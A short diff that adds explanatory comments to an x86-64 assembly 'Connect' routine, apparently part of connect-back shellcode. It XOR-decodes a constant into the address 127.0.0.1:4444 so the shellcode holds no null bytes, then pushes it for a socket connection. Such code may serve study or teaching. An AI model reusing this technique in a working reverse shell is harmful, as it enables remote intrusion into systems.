@@ -43,10 +43,12 @@ Connect:
     ; padding for the sockaddr struct
     push rax
 
+	; address 127.0.0.1:4444
     mov rbx, 0xfeffff80a3eefffd
     mov rcx, 0xffffffffffffffff
     xor rbx, rcx
 
+	; push the pointer to the remote address on the stack
     push rbx
     mov rsi, rsp
 
